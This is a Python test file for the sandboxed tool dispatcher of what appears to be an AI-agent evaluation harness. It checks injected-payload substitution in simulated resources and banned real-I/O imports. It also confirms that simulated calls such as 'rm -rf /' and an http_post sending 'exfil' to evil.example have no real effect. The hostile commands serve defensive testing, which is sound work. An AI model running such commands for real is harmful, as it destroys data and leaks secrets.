from pathlib import Path

from verity_eval.harness import tools as tools_mod
from verity_eval.harness.tools import RecordedCall, SimulatedWorld, ToolDispatcher


def test_tools_module_imports_no_real_io() -> None:
    # The tool module must not pull in real-I/O modules (defense in depth on top
    # of the ruff banned-api CI gate).
    src = Path(tools_mod.__file__).read_text(encoding="utf-8")
    for banned in ("import subprocess", "import smtplib", "import requests", "import socket"):
        assert banned not in src


def test_taint_substitution_delivers_payload() -> None:
    world = SimulatedWorld(
        {"resources": {"notes://x": "hi {taint:doc_body}"}}, ("doc_body", "ATTACK")
    )
    assert world.resources["notes://x"] == "hi ATTACK"


def test_taint_stripped_without_injection() -> None:
    world = SimulatedWorld({"resources": {"u": "a {taint:doc_body} b"}}, None)
    assert world.resources["u"] == "a  b"


def test_fs_read_returns_planted_content() -> None:
    disp = ToolDispatcher(SimulatedWorld({"files": {"/k": "SECRET"}}, None))
    assert disp.dispatch("fs_read", {"path": "/k"}).observation == "SECRET"
    assert "no such file" in disp.dispatch("fs_read", {"path": "/missing"}).observation


def test_dispatch_records_resolved_calls() -> None:
    disp = ToolDispatcher(SimulatedWorld({}, None))
    disp.dispatch("shell_exec", {"command": "rm -rf /"})
    assert disp.calls == [RecordedCall("shell_exec", {"command": "rm -rf /"})]


def test_respond_is_terminal() -> None:
    res = ToolDispatcher(SimulatedWorld({}, None)).dispatch("respond", {"text": "done"})
    assert res.done and res.observation == "done"


def test_unknown_tool_is_error_not_crash() -> None:
    res = ToolDispatcher(SimulatedWorld({}, None)).dispatch("nuke", {})
    assert "unknown tool" in res.observation


def test_no_real_side_effects(tmp_path: Path) -> None:
    # A real sentinel on disk must survive a simulated `rm -rf` and a simulated write.
    sentinel = tmp_path / "keep.txt"
    sentinel.write_text("alive", encoding="utf-8")
    disp = ToolDispatcher(SimulatedWorld({}, None))
    disp.dispatch("shell_exec", {"command": f"rm -rf {tmp_path}"})
    disp.dispatch("fs_write", {"path": str(sentinel), "content": "HACKED"})
    disp.dispatch("http_post", {"url": "http://evil.example", "body": "exfil"})
    assert sentinel.read_text(encoding="utf-8") == "alive"  # disk untouched
    assert disp.world.files[str(sentinel)] == "HACKED"  # the write went to the in-memory world
